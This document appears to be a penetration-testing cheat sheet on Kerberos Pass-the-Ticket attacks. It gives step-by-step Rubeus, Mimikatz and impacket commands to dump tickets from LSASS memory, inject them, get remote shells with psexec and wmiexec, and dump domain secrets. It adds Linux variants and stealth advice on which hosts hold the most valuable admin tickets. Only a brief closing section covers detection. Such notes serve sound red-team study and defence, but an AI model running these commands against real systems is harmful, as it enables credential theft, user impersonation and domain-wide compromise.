### Root Cause

Windows stores TGTs and TGS tickets in **LSASS process memory** for the current session.
If you can read LSASS memory you can extract those tickets and inject them into
your own session — impersonating that user without needing their password or hash.

```
Normal: user logs in → Windows stores TGT in LSASS memory 

PtT: attacker dumps that TGT from LSASS → injects into own session → attacker IS that user as far as Kerberos is concerned
```

---
### What You Are Stealing

```
TGT → lets you request any TGS as that user most powerful — full impersonation

TGS → only works for the specific service it was issued for more limited but still useful for lateral movement
````

---
### Step 1 — Dump Tickets from Memory

**Rubeus (on compromised Windows machine):**
```powershell
# List all tickets currently in memory
Rubeus.exe triage

# Dump all tickets
Rubeus.exe dump

# Dump specific user's ticket
Rubeus.exe dump /user:Administrator

# Dump and save to file
Rubeus.exe dump /user:Administrator /service:krbtgt /nowrap
````

**Mimikatz:**

```
# Export all tickets as .kirbi files to disk
sekurlsa::tickets /export

# Lists tickets in memory
kerberos::list
```

Output gives you `.kirbi` files — one per ticket.

---
### Step 2 — Identify the Ticket You Want

```
Look for:
→ TGTs (service = krbtgt)        → most valuable, full impersonation
→ High privilege users            → Administrator, Domain Admins
→ Service tickets for targets     → if you just need access to specific service
```

Rubeus triage output looks like:

```
User       : Administrator
Domain     : domain.local
Service    : krbtgt          ← this is a TGT
```

---
### Step 3 — Inject the Ticket

**Rubeus:**

```powershell
# Inject .kirbi ticket into current session
Rubeus.exe ptt /ticket:Administrator.kirbi

# Or inject base64 encoded ticket directly
Rubeus.exe ptt /ticket:BASE64_TICKET_STRING
```

**Mimikatz:**

```
kerberos::ptt Administrator.kirbi
```

---
### Step 4 — Verify Injection

```cmd
# Check tickets currently in your session
klist

# Should show the injected ticket with the victim's username
```

---
### Step 5 — Use the Ticket

```cmd
# Access file shares as the victim user
dir \\TARGET\C$

# Get shell via PSExec
impacket-psexec -k -no-pass domain.local/Administrator@TARGET_IP

# WMI execution
impacket-wmiexec -k -no-pass domain.local/Administrator@TARGET_IP

# Access any service the victim had access to
```

---
### From Linux — Full Flow

```bash
# Step 1 — if you have creds/hash, request TGT directly
impacket-getTGT domain.local/Administrator -hashes :NTLM_HASH

# Output: Administrator.ccache

# Step 2 — set the ticket as your Kerberos credential
export KRB5CCNAME=Administrator.ccache

# Step 3 — use impacket tools with -k flag (use Kerberos)
impacket-psexec -k -no-pass domain.local/Administrator@TARGET_IP
impacket-secretsdump -k -no-pass domain.local/Administrator@DC_IP
impacket-smbclient -k -no-pass domain.local/Administrator@TARGET_IP
```

> **Windows uses .kirbi format** 
> **Linux uses .ccache format** 
> 
> Convert between them:
> 
> ```bash
> impacket-ticketConverter ticket.kirbi ticket.ccache
> impacket-ticketConverter ticket.ccache ticket.kirbi
> ```

---
### When to Use PtT vs PtH

```
Have NTLM hash + NTLM allowed    → Pass the Hash (simpler)
Have NTLM hash + NTLM blocked    → Overpass the Hash → get TGT → Pass the Ticket
Have ticket from memory          → Pass the Ticket directly
Want stealthier approach         → Pass the Ticket (Kerberos blends in better than NTLM)
```

---
### Where Tickets Live — Important for Opsec

```
Windows stores tickets per logon session — not per machine
→ each logged in user has their own ticket cache
→ you need SYSTEM or SeDebugPrivilege to read other users tickets from LSASS

Most valuable targets:
→ machines where admins are actively logged in
→ jump boxes / bastion hosts (admins RDP from here → their TGTs are here)
→ Domain Controllers (krbtgt ticket, DA tickets all here)
```

---
### Detection

```
Event ID 4768  → TGT requested
Event ID 4769  → TGS requested
Event ID 4624  → logon event

Look for:
→ ticket used from different IP than where it was issued
→ ticket used outside normal working hours
→ ticket with anomalous encryption type
```

---
### Full PtT Flow Summary

```
Land on machine
→ check who is logged in (qwinsta / query session)
→ dump tickets from LSASS (Rubeus dump / mimikatz)
→ identify high value tickets (admin TGTs)
→ inject ticket (Rubeus ptt / mimikatz kerberos::ptt)
→ verify with klist
→ access resources as that user
```

